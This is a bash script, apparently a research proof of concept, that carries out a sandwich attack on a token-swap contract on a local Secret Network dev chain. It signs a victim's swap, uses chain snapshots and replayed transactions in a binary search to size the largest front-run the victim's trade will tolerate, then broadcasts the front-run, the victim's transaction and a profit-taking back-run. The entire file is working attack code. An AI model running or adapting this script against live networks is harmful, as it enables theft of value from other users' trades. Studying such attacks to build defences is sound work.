set -x
set -e

VICTIM='secret1ldjxljw7v4vk6zhyduywh04hpj0jdwxsmrlatf'
ADV='secret1ajz54hz8azwuy34qwy9fkjnfcrvf0dzswy0lqq'
ADMIN='secret1fc3fzy78ttp0lwuujw7e52rhspxn8uj52zfyne'
UNIQUE_LABEL=$(date '+%Y-%m-%d-%H:%M:%S')
PASSPHRASE=`cat passphrase.txt`
CHAIN_ID='secretdev-1'
SECRETD=./secretd

sleep_time=5

generate_and_sign_tx() {
  $SECRETD tx compute execute $CONTRACT_ADDRESS --generate-only "{\"swap\":{\"token_type\":\"$1\",\"offer_amt\":$2,\"expected_return_amt\":$3,\"receiver\":\"$4\"}}" --from $4 --enclave-key io-master-cert.der --code-hash $CODE_HASH --label $UNIQUE_LABEL -y --broadcast-mode sync > tx_$5.json
  echo $PASSPHRASE | $SECRETD tx sign tx_$5.json --chain-id $CHAIN_ID --from $4 --keyring-backend file -y > tx_$5_sign.json
}

deliver_tx() {
  echo $PASSPHRASE | $SECRETD tx compute delivertx tx_$1_sign.json --from $ADMIN --keyring-backend file -y
  sleep $sleep_time
}

execute_tx() {
  echo $PASSPHRASE | $SECRETD tx compute execute $CONTRACT_ADDRESS "{\"swap\":{\"token_type\":\"$1\",\"offer_amt\":$2,\"expected_return_amt\":$3,\"receiver\":\"$4\"}}"  --from $4 --keyring-backend file -y
  sleep $sleep_time
}

set_snapshot() {
    echo $PASSPHRASE | $SECRETD tx compute snapshot --from $ADMIN --keyring-backend file "snapshot$1" -y --broadcast-mode sync > /dev/null
    sleep $sleep_time
}

reset_snapshot() {
    echo $PASSPHRASE | $SECRETD tx compute snapshot --from $ADMIN --keyring-backend file "" -y --broadcast-mode sync > /dev/null
    sleep $sleep_time
}

query_pool() {
  size=$(echo $PASSPHRASE | $SECRETD q compute query $CONTRACT_ADDRESS "{\"$1\":{}}")
  echo $size
}

broadcast_tx() {
   echo $PASSPHRASE | $SECRETD tx broadcast tx_$1_sign.json --from $ADMIN --keyring-backend file -y
  sleep $sleep_time
}

reset_snapshot
./node_modules/.bin/jest -t Deploy

CONTRACT_ADDRESS=`cat contractAddress.txt`
CODE_HASH=`cat codeHash.txt`

# make victim tx
generate_and_sign_tx token_a 10 20 $VICTIM victim

cnt=0
lo=15
hi=25
while [ $(expr $hi - $lo) -ne 1 ]; do
  mid=$(expr '(' $hi + $lo ')' / 2)
  echo $lo $hi $mid

  generate_and_sign_tx token_a $mid 0 $ADV adv

  set_snapshot $cnt

  query_pool pool_a
  deliver_tx adv
  old_pool_a=$(query_pool pool_a)
  deliver_tx victim
  new_pool_a=$(query_pool pool_a)
  dif_pool_a=$(($new_pool_a - $old_pool_a))
  echo $old_pool_a $new_pool_a $dif_pool_a

  if [ $dif_pool_a -gt 0 ]; then lo=$mid; else hi=$mid; fi
  cnt=$((cnt + 1))
done
echo $lo

# make front-run tx
generate_and_sign_tx token_a $lo 0 $ADV adv

set_snapshot $cnt
old_pool_b=$(query_pool pool_b)
deliver_tx adv
new_pool_b=$(query_pool pool_b)
dif_pool_b=$(($old_pool_b - $new_pool_b))

# broadcast all 3 txs
reset_snapshot
broadcast_tx adv
./node_modules/.bin/jest -t QuerySwap
broadcast_tx victim
./node_modules/.bin/jest -t QuerySwap
# send back-run tx
execute_tx token_b $dif_pool_b 0 $ADV
./node_modules/.bin/jest -t QuerySwap